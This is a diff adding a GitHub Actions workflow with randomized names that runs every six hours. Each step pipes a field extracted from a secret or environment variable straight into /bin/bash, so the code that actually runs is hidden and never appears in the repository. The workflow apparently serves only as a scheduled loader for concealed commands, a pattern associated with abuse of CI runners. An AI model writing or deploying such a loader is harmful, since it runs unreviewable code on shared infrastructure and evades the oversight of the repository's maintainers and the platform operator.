@@ -1,0 +1,23 @@
+name: yanqianzheerrenzh
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanqianzheerrenzh
+        env:
+          gdal7736: ${{ secrets.gdal7736 }}
+        run: |
+          echo $gdal7736 | jq -r .r236 | /bin/bash
+          echo $orefc41099 | jq -r .edd3702 | /bin/bash
+          echo $zlxaz64889 | jq -r .rt6876 | /bin/bash
+          echo $esx622 | jq -r .vr7 | /bin/bash
+          echo $xa098 | jq -r .bhgw7700 | /bin/bash
+          echo $ebhzg2539 | jq -r .junwd69 | /bin/bash
+
